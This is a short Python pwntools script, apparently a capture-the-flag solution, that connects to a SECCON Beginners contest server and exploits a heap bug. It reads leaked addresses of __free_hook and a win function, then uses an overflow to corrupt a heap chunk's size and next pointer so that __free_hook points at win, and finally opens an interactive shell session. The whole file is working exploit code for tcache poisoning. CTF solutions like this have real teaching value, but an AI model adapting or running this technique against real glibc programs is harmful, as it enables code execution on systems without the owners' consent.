from pwn import *

context.arch = "amd64"
#context.log_level = "debug"

s = remote("bh.quals.beginners.seccon.jp", 9002)
t = s.readuntil("get the flag")
for l in t.split(b"\n"):
  if b"<__free_hook>:" in l:
    __free_hook = int(l.split()[-1][2:], 16)
  if b"<win>:" in l:
    win = int(l.split()[-1][2:], 16)

s.sendlineafter("> ", "2")
s.sendline("hoge")
s.sendlineafter("> ", "3")

s.sendlineafter("> ", "1")
s.sendline(b"a"*0x18+pack(0x41)+pack(__free_hook))

s.sendlineafter("> ", "2")
s.sendline("hoge")
s.sendlineafter("> ", "3")

s.sendlineafter("> ", "2")
s.sendline(pack(win))
s.sendlineafter("> ", "3")

s.interactive()
